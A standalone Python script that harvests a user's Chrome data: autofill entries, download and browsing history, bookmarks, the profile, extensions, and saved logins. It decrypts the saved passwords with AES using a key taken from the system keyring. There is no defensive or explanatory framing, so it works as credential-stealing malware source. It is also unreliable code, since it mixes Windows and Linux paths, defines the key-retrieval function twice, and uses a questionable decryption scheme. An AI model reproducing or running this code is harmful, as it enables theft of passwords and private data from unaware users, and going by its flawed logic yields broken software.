import os
import json
import shutil
import sqlite3
import secretstorage
from datetime import datetime, timezone, timedelta
from Cryptodome.Cipher import AES  # Requires pycryptodomex
import base64

# Helper function to convert Chrome timestamp to readable format
def chrome_timestamp_to_datetime(chrome_time):
    if chrome_time:
        return datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=chrome_time)
    return None


# List Chrome extensions
def list_extensions():
    try:
        ext_path = os.path.join(os.environ['USERPROFILE'],
                                'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
        if os.path.exists(ext_path):
            extensions = os.listdir(ext_path)
            return {"extensions": extensions}
        return {"extensions": [], "error": "Extensions directory not found"}
    except Exception as e:
        return {"extensions": [], "error": str(e)}


# Get user profile
def get_user_profile():
    try:
        path = os.path.join(os.environ['USERPROFILE'],
                            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        with open(path, 'r', encoding='utf-8') as file:
            data = json.load(file)
        profile = data.get('profile', {})
        return {"profile": profile}
    except Exception as e:
        return {"profile": {}, "error": str(e)}


# Get autofill data
def get_autofill():
    try:
        autofill_db = os.path.join(os.environ['USERPROFILE'],
                                   'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
        temp_db = 'WebData_temp'
        shutil.copyfile(autofill_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        results = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        return {"autofill": [{"name": name, "value": value} for name, value in results]}
    except Exception as e:
        return {"autofill": [], "error": str(e)}


# Get download history
def get_downloads():
    try:
        path = os.path.join(os.environ['USERPROFILE'],
                            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
        temp_db = 'Downloads_temp'
        shutil.copyfile(path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT target_path, tab_url FROM downloads, downloads_url_chains WHERE downloads.id = downloads_url_chains.id")
        results = cursor.fetchall()
        conn.close()
        os.remove(temp_db)
        return {"downloads": [{"file_path": file_path, "source_url": source_url} for file_path, source_url in results]}
    except Exception as e:
        return {"downloads": [], "error": str(e)}


# Get saved passwords
def get_saved_passwords():
    try:
        # Chrome's default profile path on Linux
        login_db = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
        if not os.path.exists(login_db):
            return {"passwords": [], "error": "Login Data file not found"}

        # Copy the database to a temporary file to avoid locking issues
        temp_db = 'Login_temp'
        shutil.copyfile(login_db, temp_db)

        # Connect to the SQLite database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        results = []
        for url, username, encrypted_password in cursor.fetchall():
            try:
                # On Linux, passwords are encrypted with AES-256-GCM
                # The encryption key is stored in 'Local State' and protected by the system keyring
                password = decrypt_password(encrypted_password)
                if password:
                    results.append({"url": url, "username": username, "password": password})
            except Exception as e:
                print(f"Failed to decrypt password for {url}: {str(e)}")
                continue

        conn.close()
        os.remove(temp_db)
        return {"passwords": results}
    except Exception as e:
        return {"passwords": [], "error": str(e)}


def decrypt_password(encrypted_password):
    try:
        # Chrome's encrypted password starts with 'v10' or 'v11' followed by the IV and ciphertext
        if not encrypted_password.startswith(b'v10'):
            return None  # Unsupported encryption version

        # Get the encryption key from Chrome's 'Local State' file
        key = get_encryption_key()
        if not key:
            return None

        # Extract initialization vector (IV) and ciphertext
        iv = encrypted_password[3:15]  # 12 bytes after 'v10'
        ciphertext = encrypted_password[15:-16]  # Remove padding and tag
        tag = encrypted_password[-16:]  # Last 16 bytes are the GCM tag

        # Decrypt using AES-GCM
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_password.decode('utf-8')
    except Exception as e:
        return None


def get_encryption_key():
    try:
        # Path to Chrome's Local State file
        local_state_path = os.path.expanduser('~/.config/google-chrome/Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        # Encryption key is base64-encoded and encrypted with the system keyring
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        if encrypted_key.startswith(b'DPAPI'):
            return None  # DPAPI is Windows-specific; we need Linux keyring access

        # On Linux, the key is encrypted with the user's login keyring
        # This requires access to the keyring (e.g., via libsecret or manual user input)
        # For simplicity, this example assumes the key is available unencrypted (not realistic)
        # In practice, use secretstorage or similar to access the keyring
        key = encrypted_key[5:]  # Remove 'v10' prefix (simplified; real decryption needed)
        return key
    except Exception as e:
        print(f"Failed to get encryption key: {str(e)}")
        return None


# Get bookmarks
def get_bookmarks():
    try:
        path = os.path.join(os.environ['USERPROFILE'],
                            'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks')
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        bookmarks = data.get('roots', {}).get('bookmark_bar', {})
        return {"bookmarks": bookmarks}
    except Exception as e:
        return {"bookmarks": {}, "error": str(e)}


# Get browsing history
def get_browsing_history(limit=10):
    try:
        history_db = os.path.join(os.environ['USERPROFILE'],
                                  'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
        temp_db = 'History_temp'
        shutil.copyfile(history_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        results = [{"url": url, "title": title, "last_visit": chrome_timestamp_to_datetime(visit_time)}
                   for url, title, visit_time in cursor.fetchall()]
        conn.close()
        os.remove(temp_db)
        return {"history": results}
    except Exception as e:
        return {"history": [], "error": str(e)}



def get_encryption_key():
    with secretstorage.dbus_init() as conn:
        collection = secretstorage.get_default_collection(conn)
        items = collection.search_items({'application': 'Chrome'})
        for item in items:
            return item.get_secret()  # Requires unlocking the keyring
    return None